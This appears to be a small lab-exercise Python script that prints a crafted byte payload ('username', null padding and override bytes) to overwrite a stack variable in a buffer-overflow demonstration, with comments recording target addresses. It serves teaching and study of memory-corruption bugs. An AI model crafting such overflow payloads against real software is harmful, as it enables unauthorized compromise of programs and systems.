#!/usr/bin/env python3

"""
Stack Variable Overwrite Demonstration
--------------------------------------

This script generates a crafted input payload designed to demonstrate
a stack-based buffer overflow vulnerability in a controlled laboratory
environment.
"""

import sys

sys.stdout.buffer.write(b"\x75\x73\x65\x72\x6e\x61\x6d\x65\x00\x00\x41\x2b")

# 0x7ffffff2924b address of gr
# 0x0000000000401e16 address after read_input is called
